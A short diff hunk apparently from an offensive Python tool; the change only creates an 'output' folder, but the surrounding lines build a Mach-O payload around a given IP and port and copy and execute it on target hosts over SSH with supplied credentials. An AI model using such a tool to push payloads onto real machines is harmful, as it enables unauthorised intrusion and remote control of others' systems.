@@ -419,6 +419,8 @@ def main():
                 exit()
             payload = build_macho(m_ip, m_port)
             filename = randomword(10)
+            if not os.path.exists("output"):
+                os.makedirs("output")
             with open('output/' + filename, 'w') as file:
                 file.write(payload)
             start_thread(targets, "copy_exec", [22, args.username, args.password, args.identity_file, filename, 2])
